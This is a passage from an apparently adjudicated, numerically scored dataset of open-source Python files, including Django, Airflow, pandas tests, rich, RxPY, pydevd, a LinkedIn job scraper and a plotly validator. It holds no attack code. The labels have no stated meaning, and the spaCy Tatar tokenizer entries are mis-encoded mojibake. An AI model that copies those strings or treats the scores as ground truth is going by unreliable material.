**kwargs):<<NEWL>>    for directory in get_template_directories():<<NEWL>>        sender.watch_dir(directory, ""**/*"")<<NEWL>><<NEWL>><<NEWL>>@receiver(file_changed, dispatch_uid=""template_loaders_file_changed"")<<NEWL>>def template_changed(sender, file_path, **kwargs):<<NEWL>>    if file_path.suffix == "".py"":<<NEWL>>        return<<NEWL>>    for template_dir in get_template_directories():<<NEWL>>        if template_dir in file_path.parents:<<NEWL>>            reset_loaders()<<NEWL>>            return True"
213	adjudicated	1	"import contextlib<<NEWL>><<NEWL>>import rope.base.oi.soi<<NEWL>>import rope.base.pyobjects<<NEWL>>from rope.base import pynames, utils<<NEWL>><<NEWL>><<NEWL>>class DefinedName(pynames.DefinedName):<<NEWL>>    pass<<NEWL>><<NEWL>><<NEWL>>class AssignedName(pynames.AssignedName):<<NEWL>>    def __init__(self, lineno=None, module=None, pyobject=None):<<NEWL>>        self.lineno = lineno<<NEWL>>        self.module = module<<NEWL>>        self.assignments = []<<NEWL>>        self.pyobject = _Inferred(<<NEWL>>            self._get_inferred, pynames._get_concluded_data(module)<<NEWL>>        )<<NEWL>>        self.pyobject.set(pyobject)<<NEWL>><<NEWL>>    @utils.prevent_recursion(lambda: None)<<NEWL>>    def _get_inferred(self):<<NEWL>>        if self.module is not None:<<NEWL>>            return rope.base.oi.soi.infer_assigned_object(self)<<NEWL>><<NEWL>>    def get_object(self):<<NEWL>>        return self.pyobject.get()<<NEWL>><<NEWL>>    def get_definition_location(self):<<NEWL>>        """"""Returns a (module, lineno) tuple""""""<<NEWL>>        if self.lineno is None and self.assignments:<<NEWL>>            with contextlib.suppress(AttributeError):<<NEWL>>                self.lineno = self.assignments[0].get_lineno()<<NEWL>>        return (self.module, self.lineno)<<NEWL>><<NEWL>>    def invalidate(self):<<NEWL>>        """"""Forget the `PyObject` this `PyName` holds""""""<<NEWL>>        self.pyobject.set(None)<<NEWL>><<NEWL>><<NEWL>>class UnboundName(pynames.UnboundName):<<NEWL>>    pass<<NEWL>><<NEWL>><<NEWL>>class ParameterName(pynames.ParameterName):<<NEWL>>    def __init__(self, pyfunction, index):<<NEWL>>        self.pyfunction = pyfunction<<NEWL>>        self.index = index<<NEWL>><<NEWL>>    def get_object(self):<<NEWL>>        result = self.pyfunction.get_parameter(self.index)<<NEWL>>        if result is None:<<NEWL>>            result = rope.base.pyobjects.get_unknown()<<NEWL>>        return result<<NEWL>><<NEWL>>    def get_objects(self):<<NEWL>>        """"""Returns the list of objects passed as this parameter""""""<<NEWL>>        return rope.base.oi.soi.get_passed_objects(self.pyfunction, self.index)<<NEWL>><<NEWL>>    def get_definition_location(self):<<NEWL>>        return (self.pyfunction.get_module(), self.pyfunction.get_ast().lineno)<<NEWL>><<NEWL>><<NEWL>>class AssignmentValue(pynames.AssignmentValue):<<NEWL>>    pass<<NEWL>><<NEWL>><<NEWL>>class EvaluatedName(pynames.EvaluatedName):<<NEWL>>    pass<<NEWL>><<NEWL>><<NEWL>>class ImportedModule(pynames.ImportedModule):<<NEWL>>    pass<<NEWL>><<NEWL>><<NEWL>>class ImportedName(pynames.ImportedName):<<NEWL>>    pass<<NEWL>><<NEWL>><<NEWL>>_Inferred = pynames._Inferred"
182	adjudicated	1	"# Licensed to the Apache Software Foundation (ASF) under one<<NEWL>># or more contributor license agreements.  See the NOTICE file<<NEWL>># distributed with this work for additional information<<NEWL>># regarding copyright ownership.  The ASF licenses this file<<NEWL>># to you under the Apache License, Version 2.0 (the<<NEWL>># ""License""); you may not use this file except in compliance<<NEWL>># with the License.  You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#   http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing,<<NEWL>># software distributed under the License is distributed on an<<NEWL>># ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY<<NEWL>># KIND, either express or implied.  See the License for the<<NEWL>># specific language governing permissions and limitations<<NEWL>># under the License.<<NEWL>>""""""Kerberos command.""""""<<NEWL>>from __future__ import annotations<<NEWL>><<NEWL>>import daemon<<NEWL>>from daemon.pidfile import TimeoutPIDLockFile<<NEWL>><<NEWL>>from airflow import settings<<NEWL>>from airflow.security import kerberos as krb<<NEWL>>from airflow.utils import cli as cli_utils<<NEWL>>from airflow.utils.cli import setup_locations<<NEWL>><<NEWL>><<NEWL>>@cli_utils.action_cli<<NEWL>>def kerberos(args):<<NEWL>>    """"""Start a kerberos ticket renewer.""""""<<NEWL>>    print(settings.HEADER)<<NEWL>><<NEWL>>    if args.daemon:<<NEWL>>        pid, stdout, stderr, _ = setup_locations(<<NEWL>>            ""kerberos"", args.pid, args.stdout, args.stderr, args.log_file<<NEWL>>        )<<NEWL>>        with open(stdout, ""a"") as stdout_handle, open(stderr, ""a"") as stderr_handle:<<NEWL>>            stdout_handle.truncate(0)<<NEWL>>            stderr_handle.truncate(0)<<NEWL>><<NEWL>>            ctx = daemon.DaemonContext(<<NEWL>>                pidfile=TimeoutPIDLockFile(pid, -1),<<NEWL>>                stdout=stdout_handle,<<NEWL>>                stderr=stderr_handle,<<NEWL>>                umask=int(settings.DAEMON_UMASK, 8),<<NEWL>>            )<<NEWL>><<NEWL>>            with ctx:<<NEWL>>                krb.run(principal=args.principal, keytab=args.keytab)<<NEWL>>    else:<<NEWL>>        krb.run(principal=args.principal, keytab=args.keytab)"
353	adjudicated	0	"import json<<NEWL>>import os<<NEWL>>import time<<NEWL>>import random<<NEWL>>from linkedin_api import Linkedin<<NEWL>>from dotenv import load_dotenv<<NEWL>>import sys<<NEWL>><<NEWL>>class Scrape():<<NEWL>>    def __init__(self, api):<<NEWL>>        self.api = api<<NEWL>>        <<NEWL>>    def read_json(self, filename='jobs.json'):<<NEWL>>        with open(filename, 'r') as file:<<NEWL>>            return json.load(file)<<NEWL>><<NEWL>>    def write_json(self, newData):<<NEWL>>        with open('jobs.json', 'r+') as file:<<NEWL>>            data = self.read_json()<<NEWL>>            data['job-list'].append(newData)<<NEWL>>            json.dump(data, file)<<NEWL>><<NEWL>>    def searchJobs(self, apiChosen, numberOfSearches, keywordChosen, offsetNumber):<<NEWL>>        jobs = apiChosen.search_jobs(keywordChosen, remote = 1, limit = \<<NEWL>>                            numberOfSearches, offset = offsetNumber)<<NEWL>>        for job in jobs:<<NEWL>>            title = job['title']<<NEWL>>            jobID = job['dashEntityUrn'].split(':')[-1] <<NEWL>>            location = job['formattedLocation']<<NEWL>>            #jobDetails = api.get_job(jobID)<<NEWL>>            jobLink = f'https://www.linkedin.com/jobs/view/{jobID}/'<<NEWL>>            job = {<<NEWL>>                ""Job title"":title,<<NEWL>>                ""Job link"":jobLink,<<NEWL>>                ""Location"":location<<NEWL>>            }<<NEWL>>            print(f""{title} : {jobID} : {location}"")<<NEWL>>            self.write_json(job)<<NEWL>>        <<NEWL>><<NEWL>>    def findSWEJobs(self, apiChosen):<<NEWL>>        listOfJobs = [""Software Developer"",""Software Engineer"", ""Software Intern"",""SDET"",""Developer Intern"",""Software co-op"",""Junior Developer""] <<NEWL>>        for i in range(11,101):<<NEWL>>            <<NEWL>>            for element in listOfJobs:<<NEWL>>                self.searchJobs(apiChosen, 1, element, i)<<NEWL>>                time.sleep(1*random.randint(1,5)+2)<<NEWL>>    <<NEWL>>if(__name__ == ""__main__""):<<NEWL>>    load_dotenv()<<NEWL>>    Password = os.getenv('PASSWORD')<<NEWL>>    Email = os.getenv('EMAIL')<<NEWL>>    api = Linkedin(Email, Password)<<NEWL>>    data = {""job-list"": [{}]}<<NEWL>>    with open('jobs.json', 'w') as file:<<NEWL>>        json.dump(data, file)<<NEWL>><<NEWL>>    scraper = Scrape(api)<<NEWL>>    scraper.findSWEJobs(api)<<NEWL>>    <<NEWL>>    "
242	adjudicated	0	"import re<<NEWL>>from typing import Iterable, List, Tuple<<NEWL>><<NEWL>>from .cells import cell_len, chop_cells<<NEWL>>from ._loop import loop_last<<NEWL>><<NEWL>>re_word = re.compile(r""\s*\S+\s*"")<<NEWL>><<NEWL>><<NEWL>>def words(text: str) -> Iterable[Tuple[int, int, str]]:<<NEWL>>    position = 0<<NEWL>>    word_match = re_word.match(text, position)<<NEWL>>    while word_match is not None:<<NEWL>>        start, end = word_match.span()<<NEWL>>        word = word_match.group(0)<<NEWL>>        yield start, end, word<<NEWL>>        word_match = re_word.match(text, end)<<NEWL>><<NEWL>><<NEWL>>def divide_line(text: str, width: int, fold: bool = True) -> List[int]:<<NEWL>>    divides: List[int] = []<<NEWL>>    append = divides.append<<NEWL>>    line_position = 0<<NEWL>>    _cell_len = cell_len<<NEWL>>    for start, _end, word in words(text):<<NEWL>>        word_length = _cell_len(word.rstrip())<<NEWL>>        if line_position + word_length > width:<<NEWL>>            if word_length > width:<<NEWL>>                if fold:<<NEWL>>                    for last, line in loop_last(<<NEWL>>                        chop_cells(word, width, position=line_position)<<NEWL>>                    ):<<NEWL>>                        if last:<<NEWL>>                            line_position = _cell_len(line)<<NEWL>>                        else:<<NEWL>>                            start += len(line)<<NEWL>>                            append(start)<<NEWL>>                else:<<NEWL>>                    if start:<<NEWL>>                        append(start)<<NEWL>>                    line_position = _cell_len(word)<<NEWL>>            elif line_position and start:<<NEWL>>                append(start)<<NEWL>>                line_position = _cell_len(word)<<NEWL>>        else:<<NEWL>>            line_position += _cell_len(word)<<NEWL>>    return divides<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":  # pragma: no cover<<NEWL>>    from .console import Console<<NEWL>><<NEWL>>    console = Console(width=10)<<NEWL>>    console.print(""12345 abcdefghijklmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWXYZ 12345"")<<NEWL>>    print(chop_cells(""abcdefghijklmnopqrstuvwxyz"", 10, position=2))"
302	adjudicated	2	"from rx.core import Observable<<NEWL>>from rx.internal import extensionmethod<<NEWL>>import math<<NEWL>><<NEWL>><<NEWL>>def determine_median(sorted_list):<<NEWL>>    if len(sorted_list) == 0:<<NEWL>>        raise Exception(""The input sequence was empty"")<<NEWL>><<NEWL>>    if len(sorted_list) % 2 == 1:<<NEWL>>        return sorted_list[int((len(sorted_list) + 1) / 2) - 1]<<NEWL>>    else:<<NEWL>>        median_1 = sorted_list[int((len(sorted_list) + 1) / 2) - 1]<<NEWL>>        median_2 = sorted_list[int((len(sorted_list) + 1) / 2)]<<NEWL>>        return float(median_1 + median_2) / 2.0<<NEWL>><<NEWL>><<NEWL>>@extensionmethod(Observable)<<NEWL>>def median(self):<<NEWL>>    """"""<<NEWL>>    Calculates the statistical median on numerical emissions. The sequence must be finite.<<NEWL>>    """"""<<NEWL>>    return self.to_sorted_list().map(lambda l: determine_median(l))<<NEWL>><<NEWL>><<NEWL>>@extensionmethod(Observable)<<NEWL>>def mode(self):<<NEWL>>    """"""<<NEWL>>    Returns the most frequently emitted value (or ""values"" if they have the same number of occurrences).<<NEWL>>    The sequence must be finite.<<NEWL>>    """"""<<NEWL>>    return self.group_by(lambda v: v) \<<NEWL>>        .flat_map(lambda grp: grp.count().map(lambda ct: (grp.key, ct))) \<<NEWL>>        .to_sorted_list(lambda t: t[1], reverse=True) \<<NEWL>>        .flat_map(lambda l: Observable.from_(l).take_while(lambda t: t[1] == l[0][1])) \<<NEWL>>        .map(lambda t: t[0])<<NEWL>><<NEWL>><<NEWL>>@extensionmethod(Observable)<<NEWL>>def variance(self):<<NEWL>>    """"""<<NEWL>>    Returns the statistical variance of the numerical emissions.<<NEWL>>    The sequence must be finite.<<NEWL>>    """"""<<NEWL>>    squared_values = self.to_list() \<<NEWL>>        .flat_map(lambda l: Observable.from_(l).average().flat_map(lambda avg: Observable.from_(l).map(lambda i: i - avg))) \<<NEWL>>        .map(lambda i: i * i) \<<NEWL>>        .publish() \<<NEWL>>        .auto_connect(2)<<NEWL>><<NEWL>>    return Observable.zip(squared_values.sum(), squared_values.count(), lambda sum, ct: sum / (ct - 1))<<NEWL>><<NEWL>><<NEWL>>@extensionmethod(Observable)<<NEWL>>def standard_deviation(self):<<NEWL>>    """"""<<NEWL>>    Returns the standard deviation of the numerical emissions:<<NEWL>>    The sequence must be finite.<<NEWL>>    """"""<<NEWL>>    return self.variance().map(lambda i: math.sqrt(i))<<NEWL>><<NEWL>>"
93	adjudicated	3	"import pytest<<NEWL>><<NEWL>>from pandas import TimedeltaIndex<<NEWL>><<NEWL>>from pandas.tseries.offsets import (<<NEWL>>    DateOffset,<<NEWL>>    Day,<<NEWL>>    Hour,<<NEWL>>)<<NEWL>><<NEWL>><<NEWL>>class TestFreq:<<NEWL>>    @pytest.mark.parametrize(""values"", [[""0 days"", ""2 days"", ""4 days""], []])<<NEWL>>    @pytest.mark.parametrize(""freq"", [""2D"", Day(2), ""48H"", Hour(48)])<<NEWL>>    def test_freq_setter(self, values, freq):<<NEWL>>        # GH#20678<<NEWL>>        idx = TimedeltaIndex(values)<<NEWL>><<NEWL>>        # can set to an offset, converting from string if necessary<<NEWL>>        idx._data.freq = freq<<NEWL>>        assert idx.freq == freq<<NEWL>>        assert isinstance(idx.freq, DateOffset)<<NEWL>><<NEWL>>        # can reset to None<<NEWL>>        idx._data.freq = None<<NEWL>>        assert idx.freq is None<<NEWL>><<NEWL>>    def test_freq_setter_errors(self):<<NEWL>>        # GH#20678<<NEWL>>        idx = TimedeltaIndex([""0 days"", ""2 days"", ""4 days""])<<NEWL>><<NEWL>>        # setting with an incompatible freq<<NEWL>>        msg = (<<NEWL>>            ""Inferred frequency 2D from passed values does not conform to ""<<NEWL>>            ""passed frequency 5D""<<NEWL>>        )<<NEWL>>        with pytest.raises(ValueError, match=msg):<<NEWL>>            idx._data.freq = ""5D""<<NEWL>><<NEWL>>        # setting with a non-fixed frequency<<NEWL>>        msg = r""<2 \* BusinessDays> is a non-fixed frequency""<<NEWL>>        with pytest.raises(ValueError, match=msg):<<NEWL>>            idx._data.freq = ""2B""<<NEWL>><<NEWL>>        # setting with non-freq string<<NEWL>>        with pytest.raises(ValueError, match=""Invalid frequency""):<<NEWL>>            idx._data.freq = ""foo""<<NEWL>><<NEWL>>    def test_freq_view_safe(self):<<NEWL>>        # Setting the freq for one TimedeltaIndex shouldn't alter the freq<<NEWL>>        #  for another that views the same data<<NEWL>><<NEWL>>        tdi = TimedeltaIndex([""0 days"", ""2 days"", ""4 days""], freq=""2D"")<<NEWL>>        tda = tdi._data<<NEWL>><<NEWL>>        tdi2 = TimedeltaIndex(tda)._with_freq(None)<<NEWL>>        assert tdi2.freq is None<<NEWL>><<NEWL>>        # Original was not altered<<NEWL>>        assert tdi.freq == ""2D""<<NEWL>>        assert tda.freq == ""2D"""
394	adjudicated	2	"import sys<<NEWL>>from dataclasses import dataclass<<NEWL>><<NEWL>><<NEWL>>@dataclass<<NEWL>>class WindowsConsoleFeatures:<<NEWL>>    """"""Windows features available.""""""<<NEWL>><<NEWL>>    vt: bool = False<<NEWL>>    """"""The console supports VT codes.""""""<<NEWL>>    truecolor: bool = False<<NEWL>>    """"""The console supports truecolor.""""""<<NEWL>><<NEWL>><<NEWL>>try:<<NEWL>>    import ctypes<<NEWL>>    from ctypes import LibraryLoader<<NEWL>><<NEWL>>    if sys.platform == ""win32"":<<NEWL>>        windll = LibraryLoader(ctypes.WinDLL)<<NEWL>>    else:<<NEWL>>        windll = None<<NEWL>>        raise ImportError(""Not windows"")<<NEWL>><<NEWL>>    from pip._vendor.rich._win32_console import (<<NEWL>>        ENABLE_VIRTUAL_TERMINAL_PROCESSING,<<NEWL>>        GetConsoleMode,<<NEWL>>        GetStdHandle,<<NEWL>>        LegacyWindowsError,<<NEWL>>    )<<NEWL>><<NEWL>>except (AttributeError, ImportError, ValueError):<<NEWL>><<NEWL>>    # Fallback if we can't load the Windows DLL<<NEWL>>    def get_windows_console_features() -> WindowsConsoleFeatures:<<NEWL>>        features = WindowsConsoleFeatures()<<NEWL>>        return features<<NEWL>><<NEWL>>else:<<NEWL>><<NEWL>>    def get_windows_console_features() -> WindowsConsoleFeatures:<<NEWL>>        """"""Get windows console features.<<NEWL>><<NEWL>>        Returns:<<NEWL>>            WindowsConsoleFeatures: An instance of WindowsConsoleFeatures.<<NEWL>>        """"""<<NEWL>>        handle = GetStdHandle()<<NEWL>>        try:<<NEWL>>            console_mode = GetConsoleMode(handle)<<NEWL>>            success = True<<NEWL>>        except LegacyWindowsError:<<NEWL>>            console_mode = 0<<NEWL>>            success = False<<NEWL>>        vt = bool(success and console_mode & ENABLE_VIRTUAL_TERMINAL_PROCESSING)<<NEWL>>        truecolor = False<<NEWL>>        if vt:<<NEWL>>            win_version = sys.getwindowsversion()<<NEWL>>            truecolor = win_version.major > 10 or (<<NEWL>>                win_version.major == 10 and win_version.build >= 15063<<NEWL>>            )<<NEWL>>        features = WindowsConsoleFeatures(vt=vt, truecolor=truecolor)<<NEWL>>        return features<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    import platform<<NEWL>><<NEWL>>    features = get_windows_console_features()<<NEWL>>    from pip._vendor.rich import print<<NEWL>><<NEWL>>    print(f'platform=""{platform.system()}""')<<NEWL>>    print(repr(features))"
5	adjudicated	1	"# coding: utf8<<NEWL>>from __future__ import unicode_literals<<NEWL>><<NEWL>>from ...symbols import ORTH, LEMMA, NORM<<NEWL>><<NEWL>>_exc = {}<<NEWL>><<NEWL>>_abbrev_exc = [<<NEWL>>    # Weekdays abbreviations<<NEWL>>    {ORTH: ""Ð´Ñ"", LEMMA: ""Ð´Ò¯ÑÓÐ¼Ð±Ðµ""},<<NEWL>>    {ORTH: ""ÑÑ"", LEMMA: ""ÑÐ¸ÑÓÐ¼Ð±Ðµ""},<<NEWL>>    {ORTH: ""ÑÑ"", LEMMA: ""ÑÓÑÑÓÐ¼Ð±Ðµ""},<<NEWL>>    {ORTH: ""Ð¿Ñ"", LEMMA: ""Ð¿ÓÐ½ÒÐµÑÓÐ¼Ð±Ðµ""},<<NEWL>>    {ORTH: ""ÒÐ¼"", LEMMA: ""ÒÐ¾Ð¼Ð³Ð°""},<<NEWL>>    {ORTH: ""ÑÐ±"", LEMMA: ""ÑÐ¸Ð¼Ð±Ó""},<<NEWL>>    {ORTH: ""ÑÑ"", LEMMA: ""ÑÐºÑÓÐ¼Ð±Ðµ""},<<NEWL>>    # Months abbreviations<<NEWL>>    {ORTH: ""Ð³ÑÐ¹"", LEMMA: ""Ð³ÑÐ¹Ð½Ð²Ð°Ñ""},<<NEWL>>    {ORTH: ""ÑÐµÐ²"", LEMMA: ""ÑÐµÐ²ÑÐ°Ð»Ñ""},<<NEWL>>    {ORTH: ""Ð¼Ð°Ñ"", LEMMA: ""Ð¼Ð°ÑÑ""},<<NEWL>>    {ORTH: ""Ð¼Ð°Ñ"", LEMMA: ""Ð¼Ð°ÑÑ""},<<NEWL>>    {ORTH: ""Ð°Ð¿Ñ"", LEMMA: ""Ð°Ð¿ÑÐµÐ»Ñ""},<<NEWL>>    {ORTH: ""Ð¸ÑÐ½"", LEMMA: ""Ð¸ÑÐ½Ñ""},<<NEWL>>    {ORTH: ""Ð¸ÑÐ»"", LEMMA: ""Ð¸ÑÐ»Ñ""},<<NEWL>>    {ORTH: ""Ð°Ð²Ð³"", LEMMA: ""Ð°Ð²Ð³ÑÑÑ""},<<NEWL>>    {ORTH: ""ÑÐµÐ½"", LEMMA: ""ÑÐµÐ½ÑÑÐ±ÑÑ""},<<NEWL>>    {ORTH: ""Ð¾ÐºÑ"", LEMMA: ""Ð¾ÐºÑÑÐ±ÑÑ""},<<NEWL>>    {ORTH: ""Ð½Ð¾Ñ"", LEMMA: ""Ð½Ð¾ÑÐ±ÑÑ""},<<NEWL>>    {ORTH: ""Ð´ÐµÐº"", LEMMA: ""Ð´ÐµÐºÐ°Ð±ÑÑ""},<<NEWL>>    # Number abbreviations<<NEWL>>    {ORTH: ""Ð¼Ð»ÑÐ´"", LEMMA: ""Ð¼Ð¸Ð»Ð»Ð¸Ð°ÑÐ´""},<<NEWL>>    {ORTH: ""Ð¼Ð»Ð½"", LEMMA: ""Ð¼Ð¸Ð»Ð»Ð¸Ð¾Ð½""},<<NEWL>>]<<NEWL>><<NEWL>>for abbr in _abbrev_exc:<<NEWL>>    for orth in (abbr[ORTH], abbr[ORTH].capitalize(), abbr[ORTH].upper()):<<NEWL>>        _exc[orth] = [{ORTH: orth, LEMMA: abbr[LEMMA], NORM: abbr[LEMMA]}]<<NEWL>>        _exc[orth + "".""] = [{ORTH: orth + ""."", LEMMA: abbr[LEMMA], NORM: abbr[LEMMA]}]<<NEWL>><<NEWL>>for exc_data in [  # ""etc."" abbreviations<<NEWL>>    {ORTH: ""Ò».Ð±.Ñ."", NORM: ""Ò»ÓÐ¼ Ð±Ð°ÑÐºÐ° ÑÑÐ½Ð´ÑÐ¹Ð»Ð°Ñ""},<<NEWL>>    {ORTH: ""Ò».Ð±."", NORM: ""Ò»ÓÐ¼ Ð±Ð°ÑÐºÐ°""},<<NEWL>>    {ORTH: ""Ð±.Ñ.Ðº."", NORM: ""Ð±ÐµÐ·Ð½ÐµÒ£ ÑÑÐ°Ð³Ð° ÐºÐ°Ð´ÓÑ""},<<NEWL>>    {ORTH: ""Ð±.Ñ."", NORM: ""Ð±ÐµÐ·Ð½ÐµÒ£ ÑÑÐ°""},<<NEWL>>]:<<NEWL>>    exc_data[LEMMA] = exc_data[NORM]<<NEWL>>    _exc[exc_data[ORTH]] = [exc_data]<<NEWL>><<NEWL>>TOKENIZER_EXCEPTIONS = _exc"
145	adjudicated	2	"from selenium.webdriver.common.keys import Keys<<NEWL>>from .utils import shift<<NEWL>><<NEWL>>INITIAL_CELLS = ['print(""a"")', 'print(""b"")', 'print(""c"")']<<NEWL>><<NEWL>>def test_insert_cell(prefill_notebook):<<NEWL>>    notebook = prefill_notebook(INITIAL_CELLS)<<NEWL>><<NEWL>>    notebook.to_command_mode()<<NEWL>>    notebook.focus_cell(2)<<NEWL>>    notebook.convert_cell_type(2, ""markdown"")<<NEWL>>    <<NEWL>>    # insert code cell above<<NEWL>>    notebook.current_cell.send_keys(""a"")<<NEWL>>    assert notebook.get_cell_contents(2) == """"<<NEWL>>    assert notebook.get_cell_type(2) == ""code""<<NEWL>>    assert len(notebook.cells) == 4<<NEWL>>    <<NEWL>>    # insert code cell below<<NEWL>>    notebook.current_cell.send_keys(""b"")<<NEWL>>    assert notebook.get_cell_contents(2) == """"<<NEWL>>    assert notebook.get_cell_contents(3) == """"<<NEWL>>    assert notebook.get_cell_type(3) == ""code""<<NEWL>>    assert len(notebook.cells) == 5<<NEWL>><<NEWL>>    notebook.edit_cell(index=1, content=""cell1"")<<NEWL>>    notebook.focus_cell(1)<<NEWL>>    notebook.current_cell.send_keys(""a"")<<NEWL>>    assert notebook.get_cell_contents(1) == """"<<NEWL>>    assert notebook.get_cell_contents(2) == ""cell1""<<NEWL>><<NEWL>>    notebook.edit_cell(index=1, content='cell1')<<NEWL>>    notebook.edit_cell(index=2, content='cell2')<<NEWL>>    notebook.edit_cell(index=3, content='cell3')<<NEWL>>    notebook.focus_cell(2)<<NEWL>>    notebook.current_cell.send_keys(""b"")<<NEWL>>    assert notebook.get_cell_contents(1) == ""cell1""<<NEWL>>    assert notebook.get_cell_contents(2) == ""cell2""<<NEWL>>    assert notebook.get_cell_contents(3) == """"<<NEWL>>    assert notebook.get_cell_contents(4) == ""cell3""<<NEWL>><<NEWL>>    # insert above multiple selected cells<<NEWL>>    notebook.focus_cell(1)<<NEWL>>    shift(notebook.browser, Keys.DOWN)<<NEWL>>    notebook.current_cell.send_keys('a')<<NEWL>>    <<NEWL>>    # insert below multiple selected cells<<NEWL>>    notebook.focus_cell(2)<<NEWL>>    shift(notebook.browser, Keys.DOWN)<<NEWL>>    notebook.current_cell.send_keys('b')<<NEWL>>    assert notebook.get_cells_contents()[1:5] == ["""", ""cell1"", ""cell2"", """"]"
54	adjudicated	1	"import numpy as np<<NEWL>>import pytest<<NEWL>><<NEWL>>import pandas.util._test_decorators as td<<NEWL>><<NEWL>>from pandas import DataFrame<<NEWL>>import pandas._testing as tm<<NEWL>><<NEWL>><<NEWL>>class TestCopy:<<NEWL>>    @pytest.mark.parametrize(""attr"", [""index"", ""columns""])<<NEWL>>    def test_copy_index_name_checking(self, float_frame, attr):<<NEWL>>        # don't want to be able to modify the index stored elsewhere after<<NEWL>>        # making a copy<<NEWL>>        ind = getattr(float_frame, attr)<<NEWL>>        ind.name = None<<NEWL>>        cp = float_frame.copy()<<NEWL>>        getattr(cp, attr).name = ""foo""<<NEWL>>        assert getattr(float_frame, attr).name is None<<NEWL>><<NEWL>>    def test_copy_cache(self):<<NEWL>>        # GH#31784 _item_cache not cleared on copy causes incorrect reads after updates<<NEWL>>        df = DataFrame({""a"": [1]})<<NEWL>><<NEWL>>        df[""x""] = [0]<<NEWL>>        df[""a""]<<NEWL>><<NEWL>>        df.copy()<<NEWL>><<NEWL>>        df[""a""].values[0] = -1<<NEWL>><<NEWL>>        tm.assert_frame_equal(df, DataFrame({""a"": [-1], ""x"": [0]}))<<NEWL>><<NEWL>>        df[""y""] = [0]<<NEWL>><<NEWL>>        assert df[""a""].values[0] == -1<<NEWL>>        tm.assert_frame_equal(df, DataFrame({""a"": [-1], ""x"": [0], ""y"": [0]}))<<NEWL>><<NEWL>>    def test_copy(self, float_frame, float_string_frame):<<NEWL>>        cop = float_frame.copy()<<NEWL>>        cop[""E""] = cop[""A""]<<NEWL>>        assert ""E"" not in float_frame<<NEWL>><<NEWL>>        # copy objects<<NEWL>>        copy = float_string_frame.copy()<<NEWL>>        assert copy._mgr is not float_string_frame._mgr<<NEWL>><<NEWL>>    @td.skip_array_manager_invalid_test<<NEWL>>    def test_copy_consolidates(self):<<NEWL>>        # GH#42477<<NEWL>>        df = DataFrame(<<NEWL>>            {<<NEWL>>                ""a"": np.random.randint(0, 100, size=55),<<NEWL>>                ""b"": np.random.randint(0, 100, size=55),<<NEWL>>            }<<NEWL>>        )<<NEWL>><<NEWL>>        for i in range(0, 10):<<NEWL>>            df.loc[:, f""n_{i}""] = np.random.randint(0, 100, size=55)<<NEWL>><<NEWL>>        assert len(df._mgr.blocks) == 11<<NEWL>>        result = df.copy()<<NEWL>>        assert len(result._mgr.blocks) == 1"
285	adjudicated	1	"import sys<<NEWL>><<NEWL>><<NEWL>>def patch_sys_module():<<NEWL>><<NEWL>>    def patched_exc_info(fun):<<NEWL>><<NEWL>>        def pydev_debugger_exc_info():<<NEWL>>            type, value, traceback = fun()<<NEWL>>            if type == ImportError:<<NEWL>>                # we should not show frame added by plugin_import call<<NEWL>>                if traceback and hasattr(traceback, ""tb_next""):<<NEWL>>                    return type, value, traceback.tb_next<<NEWL>>            return type, value, traceback<<NEWL>><<NEWL>>        return pydev_debugger_exc_info<<NEWL>><<NEWL>>    system_exc_info = sys.exc_info<<NEWL>>    sys.exc_info = patched_exc_info(system_exc_info)<<NEWL>>    if not hasattr(sys, ""system_exc_info""):<<NEWL>>        sys.system_exc_info = system_exc_info<<NEWL>><<NEWL>><<NEWL>>def patched_reload(orig_reload):<<NEWL>><<NEWL>>    def pydev_debugger_reload(module):<<NEWL>>        orig_reload(module)<<NEWL>>        if module.__name__ == ""sys"":<<NEWL>>            # if sys module was reloaded we should patch it again<<NEWL>>            patch_sys_module()<<NEWL>><<NEWL>>    return pydev_debugger_reload<<NEWL>><<NEWL>><<NEWL>>def patch_reload():<<NEWL>>    import builtins  # Py3<<NEWL>><<NEWL>>    if hasattr(builtins, ""reload""):<<NEWL>>        sys.builtin_orig_reload = builtins.reload<<NEWL>>        builtins.reload = patched_reload(sys.builtin_orig_reload)  # @UndefinedVariable<<NEWL>>        try:<<NEWL>>            import imp<<NEWL>>            sys.imp_orig_reload = imp.reload<<NEWL>>            imp.reload = patched_reload(sys.imp_orig_reload)  # @UndefinedVariable<<NEWL>>        except:<<NEWL>>            pass<<NEWL>>    else:<<NEWL>>        try:<<NEWL>>            import importlib<<NEWL>>            sys.importlib_orig_reload = importlib.reload  # @UndefinedVariable<<NEWL>>            importlib.reload = patched_reload(sys.importlib_orig_reload)  # @UndefinedVariable<<NEWL>>        except:<<NEWL>>            pass<<NEWL>><<NEWL>>    del builtins<<NEWL>><<NEWL>><<NEWL>>def cancel_patches_in_sys_module():<<NEWL>>    sys.exc_info = sys.system_exc_info  # @UndefinedVariable<<NEWL>>    import builtins  # Py3<<NEWL>><<NEWL>>    if hasattr(sys, ""builtin_orig_reload""):<<NEWL>>        builtins.reload = sys.builtin_orig_reload<<NEWL>><<NEWL>>    if hasattr(sys, ""imp_orig_reload""):<<NEWL>>        import imp<<NEWL>>        imp.reload = sys.imp_orig_reload<<NEWL>><<NEWL>>    if hasattr(sys, ""importlib_orig_reload""):<<NEWL>>        import importlib<<NEWL>>        importlib.reload = sys.importlib_orig_reload<<NEWL>><<NEWL>>    del builtins"
114	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class FontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""font"", parent_name=""ohlc.hoverlabel"", **kwargs):<<NEWL>>        super(FontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Font""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font 